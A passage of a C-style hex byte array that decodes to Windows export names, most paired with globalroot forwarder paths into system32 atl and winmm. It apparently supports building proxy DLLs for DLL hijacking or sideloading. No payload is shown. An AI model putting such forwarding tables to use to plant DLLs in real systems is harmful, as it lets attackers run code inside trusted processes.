	0x4C, 0x6F, 0x61, 0x64, 0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x41, 0x74, 0x6C, 0x4D,
	0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x43, 0x6C, 0x61,
	0x73, 0x73, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C,
	0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74,
	0x65, 0x72, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x73, 0x00, 0x41,
	0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72,
	0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53,
	0x65, 0x72, 0x76, 0x65, 0x72, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52,
	0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x5C,
	0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
	0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52,
	0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x41,
	0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72,
	0x57, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x49, 0x6E, 0x66, 0x6F, 0x41, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65,
	0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x57, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x49, 0x6E,
	0x66, 0x6F, 0x41, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67,
	0x69, 0x73, 0x74, 0x65, 0x72, 0x57, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x49, 0x6E, 0x66,
	0x6F, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64,
	0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x57, 0x6E, 0x64, 0x43, 0x6C,
	0x61, 0x73, 0x73, 0x49, 0x6E, 0x66, 0x6F, 0x57, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75,
	0x6C, 0x65, 0x52, 0x65, 0x76, 0x6F, 0x6B, 0x65, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x4F, 0x62, 0x6A,
	0x65, 0x63, 0x74, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D,
	0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x76, 0x6F, 0x6B, 0x65, 0x43, 0x6C, 0x61, 0x73, 0x73,
	0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x73, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C,
	0x65, 0x54, 0x65, 0x72, 0x6D, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x54, 0x65, 0x72, 0x6D, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F,
	0x64, 0x75, 0x6C, 0x65, 0x55, 0x6E, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x54, 0x79,
	0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55, 0x6E, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72,
	0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C,
	0x65, 0x55, 0x6E, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x65,
	0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75,
	0x6C, 0x65, 0x55, 0x6E, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76,
	0x65, 0x72, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55, 0x6E, 0x72, 0x65,
	0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x45, 0x78, 0x00, 0x5C,
	0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
	0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55,
	0x6E, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x45,
	0x78, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55, 0x70, 0x64, 0x61, 0x74,
	0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x72, 0x79, 0x46, 0x72, 0x6F, 0x6D, 0x52, 0x65, 0x73,
	0x6F, 0x75, 0x72, 0x63, 0x65, 0x44, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x52, 0x65, 0x67,
	0x69, 0x73, 0x74, 0x72, 0x79, 0x46, 0x72, 0x6F, 0x6D, 0x52, 0x65, 0x73, 0x6F, 0x75, 0x72, 0x63,
	0x65, 0x44, 0x00, 0x41, 0x74, 0x6C, 0x50, 0x69, 0x78, 0x65, 0x6C, 0x54, 0x6F, 0x48, 0x69, 0x4D,
	0x65, 0x74, 0x72, 0x69, 0x63, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x50, 0x69, 0x78, 0x65, 0x6C, 0x54, 0x6F, 0x48, 0x69, 0x4D, 0x65, 0x74, 0x72, 0x69, 0x63, 0x00,
	0x41, 0x74, 0x6C, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x43, 0x6C, 0x61, 0x73, 0x73,
	0x43, 0x61, 0x74, 0x65, 0x67, 0x6F, 0x72, 0x69, 0x65, 0x73, 0x48, 0x65, 0x6C, 0x70, 0x65, 0x72,
	0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x52, 0x65, 0x67, 0x69, 0x73,
	0x74, 0x65, 0x72, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x43, 0x61, 0x74, 0x65, 0x67, 0x6F, 0x72, 0x69,
	0x65, 0x73, 0x48, 0x65, 0x6C, 0x70, 0x65, 0x72, 0x00, 0x41, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x45,
	0x72, 0x72, 0x6F, 0x72, 0x49, 0x6E, 0x66, 0x6F, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E,
	0x41, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x49, 0x6E, 0x66, 0x6F, 0x00,
	0x41, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x49, 0x6E, 0x66, 0x6F, 0x32,
	0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x45, 0x72,
	0x72, 0x6F, 0x72, 0x49, 0x6E, 0x66, 0x6F, 0x32, 0x00, 0x41, 0x74, 0x6C, 0x55, 0x6E, 0x61, 0x64,
	0x76, 0x69, 0x73, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x55,
	0x6E, 0x61, 0x64, 0x76, 0x69, 0x73, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x72,
	0x73, 0x68, 0x61, 0x6C, 0x50, 0x74, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62,
	0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41,
	0x74, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x72, 0x73, 0x68, 0x61, 0x6C, 0x50, 0x74, 0x72, 0x00, 0x41,
	0x74, 0x6C, 0x57, 0x61, 0x69, 0x74, 0x57, 0x69, 0x74, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67,
	0x65, 0x4C, 0x6F, 0x6F, 0x70, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x57, 0x61, 0x69, 0x74, 0x57, 0x69, 0x74, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x4C,
	0x6F, 0x6F, 0x70, 0x00, 0x50, 0x6C, 0x61, 0x79, 0x53, 0x6F, 0x75, 0x6E, 0x64, 0x57, 0x00, 0x5C,
	0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
	0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x50, 0x6C, 0x61, 0x79, 0x53, 0x6F, 0x75, 0x6E,
	0x64, 0x57, 0x00, 0x43, 0x6C, 0x72, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x4D, 0x61, 0x6E, 0x61,
	0x67, 0x65, 0x64, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x00, 0x43, 0x6F, 0x72, 0x42,
	0x69, 0x6E, 0x64, 0x54, 0x6F, 0x52, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x45, 0x78, 0x00, 0x44,
	0x69, 0x73, 0x63, 0x70, 0x45, 0x73, 0x74, 0x61, 0x62, 0x6C, 0x69, 0x73, 0x68, 0x53, 0x65, 0x72,
	0x76, 0x69, 0x63, 0x65, 0x4C, 0x69, 0x6E, 0x6B, 0x61, 0x67, 0x65, 0x00, 0x47, 0x64, 0x69, 0x70,
	0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x00, 0x47, 0x64, 0x69, 0x70, 0x43, 0x6C, 0x6F, 0x6E, 0x65, 0x49,
	0x6D, 0x61, 0x67, 0x65, 0x00, 0x47, 0x64, 0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x42,
	0x69, 0x74, 0x6D, 0x61, 0x70, 0x46, 0x72, 0x6F, 0x6D, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x00,
	0x47, 0x64, 0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x72, 0x6F, 0x6D, 0x48, 0x44,
	0x43, 0x00, 0x47, 0x64, 0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x48, 0x42, 0x49, 0x54,
	0x4D, 0x41, 0x50, 0x46, 0x72, 0x6F, 0x6D, 0x42, 0x69, 0x74, 0x6D, 0x61, 0x70, 0x00, 0x47, 0x64,
	0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x4C, 0x69, 0x6E, 0x65, 0x42, 0x72, 0x75, 0x73,
	0x68, 0x49, 0x00, 0x47, 0x64, 0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x6F, 0x6C,
	0x69, 0x64, 0x46, 0x69, 0x6C, 0x6C, 0x00, 0x47, 0x64, 0x69, 0x70, 0x44, 0x65, 0x6C, 0x65, 0x74,
	0x65, 0x42, 0x72, 0x75, 0x73, 0x68, 0x00, 0x47, 0x64, 0x69, 0x70, 0x44, 0x65, 0x6C, 0x65, 0x74,
	0x65, 0x47, 0x72, 0x61, 0x70, 0x68, 0x69, 0x63, 0x73, 0x00, 0x47, 0x64, 0x69, 0x70, 0x44, 0x69,
	0x73, 0x70, 0x6F, 0x73, 0x65, 0x49, 0x6D, 0x61, 0x67, 0x65, 0x00, 0x47, 0x64, 0x69, 0x70, 0x46,
	0x69, 0x6C, 0x6C, 0x52, 0x65, 0x63, 0x74, 0x61, 0x6E, 0x67, 0x6C, 0x65, 0x49, 0x00, 0x47, 0x64,
	0x69, 0x70, 0x46, 0x72, 0x65, 0x65, 0x00, 0x47, 0x64, 0x69, 0x70, 0x6C, 0x75, 0x73, 0x53, 0x68,
	0x75, 0x74, 0x64, 0x6F, 0x77, 0x6E, 0x00, 0x47, 0x64, 0x69, 0x70, 0x6C, 0x75, 0x73, 0x53, 0x74,
	0x61, 0x72, 0x74, 0x75, 0x70, 0x00, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65,
	0x4F, 0x53, 0x4B, 0x53, 0x75, 0x70, 0x70, 0x6F, 0x72, 0x74, 0x00, 0x49, 0x6E, 0x76, 0x61, 0x6C,
	0x69, 0x64, 0x61, 0x74, 0x65, 0x47, 0x61, 0x64, 0x67, 0x65, 0x74, 0x00, 0x4C, 0x6F, 0x61, 0x64,
	0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x53, 0x68, 0x69, 0x6D, 0x00, 0x4D, 0x70, 0x47, 0x65,
	0x74, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x00, 0x4D,
	0x70, 0x4D, 0x61, 0x6E, 0x61, 0x67, 0x65, 0x72, 0x44, 0x69, 0x73, 0x61, 0x62, 0x6C, 0x65, 0x00,
	0x4D, 0x70, 0x4D, 0x61, 0x6E, 0x61, 0x67, 0x65, 0x72, 0x45, 0x6E, 0x61, 0x62, 0x6C, 0x65, 0x00,
	0x4D, 0x70, 0x4D, 0x61, 0x6E, 0x61, 0x67, 0x65, 0x72, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E,
	0x51, 0x75, 0x65, 0x72, 0x79, 0x00, 0x4D, 0x70, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x53, 0x63,
	0x61, 0x6E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32,
	0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x43, 0x6F,
	0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x45, 0x6E,
	0x67, 0x69, 0x6E, 0x65, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x45, 0x6E, 0x75,
	0x6D, 0x65, 0x72, 0x61, 0x74, 0x65, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x4F,
	0x70, 0x65, 0x6E, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x51, 0x75, 0x65, 0x72,
	0x79, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x51, 0x75, 0x65, 0x72, 0x79, 0x45,
	0x78, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x52, 0x65, 0x6F, 0x70, 0x65, 0x6E,
	0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x53, 0x74, 0x61, 0x72, 0x74, 0x00, 0x53,
	0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x4D, 0x61, 0x69, 0x6E, 0x00, 0x53, 0x76, 0x63, 0x68, 0x6F,
	0x73, 0x74, 0x50, 0x75, 0x73, 0x68, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x47, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x73, 0x00, 0x54, 0x61, 0x73, 0x6B, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x49,
	0x6E, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x00, 0x55, 0x6E, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61,
	0x6C, 0x69, 0x7A, 0x65, 0x4F, 0x53, 0x4B, 0x53, 0x75, 0x70, 0x70, 0x6F, 0x72, 0x74, 0x00, 0x57,
	0x64, 0x69, 0x44, 0x69, 0x61, 0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63, 0x4D, 0x6F, 0x64, 0x75,
	0x6C, 0x65, 0x4D, 0x61, 0x69, 0x6E, 0x00, 0x57, 0x64, 0x69, 0x47, 0x65, 0x74, 0x44, 0x69, 0x61,
	0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x49, 0x6E, 0x74,
	0x65, 0x72, 0x66, 0x61, 0x63, 0x65, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x00, 0x57, 0x64,
	0x69, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x00,
	0x57, 0x6F, 0x77, 0x36, 0x34, 0x4C, 0x6F, 0x67, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69,
	0x7A, 0x65, 0x00, 0x57, 0x6F, 0x77, 0x36, 0x34, 0x4C, 0x6F, 0x67, 0x4D, 0x65, 0x73, 0x73, 0x61,
	0x67, 0x65, 0x41, 0x72, 0x67, 0x4C, 0x69, 0x73, 0x74, 0x00, 0x57, 0x6F, 0x77, 0x36, 0x34, 0x4C,
	0x6F, 0x67, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x00,
	0x57, 0x6F, 0x77, 0x36, 0x34, 0x4C, 0x6F, 0x67, 0x54, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74,
	0x65, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x49, 0x6E, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x49, 0x6E, 0x4D,
	0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x47, 0x65,
	0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x54, 0x65, 0x78, 0x74, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x45,
	0x72, 0x72, 0x6F, 0x72, 0x54, 0x65, 0x78, 0x74, 0x57, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75,
	0x74, 0x47, 0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44, 0x65, 0x76, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x4E,
	0x75, 0x6D, 0x44, 0x65, 0x76, 0x73, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x4D, 0x65,
	0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D,
	0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x6D, 0x69,
